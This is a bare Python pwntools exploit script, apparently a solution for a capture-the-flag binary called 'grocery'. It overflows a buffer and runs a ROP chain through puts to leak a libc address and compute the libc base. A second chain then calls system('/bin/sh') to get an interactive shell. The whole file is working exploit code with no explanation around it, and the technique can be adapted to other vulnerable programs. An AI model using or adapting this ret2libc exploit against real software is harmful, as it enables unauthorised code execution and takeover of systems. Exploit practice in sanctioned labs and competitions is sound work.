from pwn import *

elf = ELF('./grocery')
rop = ROP(elf)

p = elf.process()
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

OFFSET = b'A' * 35

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("main@plt: " + hex(MAIN_PLT))
log.info("POP RDI: " + hex(POP_RDI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    rop_chain = [
        POP_RDI, FUNC_GOT,
        PUTS_PLT,
        MAIN_PLT,
    ]

    rop_chain = b''.join([p64(i) for i in rop_chain])
    payload = OFFSET + rop_chain
    
    print(p.recv())
    print(payload)

    p.sendline(payload)

    received = p.recvuntil('\n')[14:].strip()
    print(received)
    leak = u64(received.ljust(8, b'\x00'))
    libc.address = leak - libc.symbols[func_name]

    return hex(leak)

log.info('Leak: ' + get_addr('puts'))
log.info('Libc base: ' + hex(libc.address))


BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']
EXIT = libc.symbols['exit']
SETUID = libc.symbols['setuid']


ROP_CHAIN = [
    RET,
    POP_RDI, BIN_SH,
    SYSTEM,
    EXIT,
]

ROP_CHAIN = b''.join([p64(i) for i in ROP_CHAIN])

payload = OFFSET + ROP_CHAIN


p.sendline(payload)

p.interactive()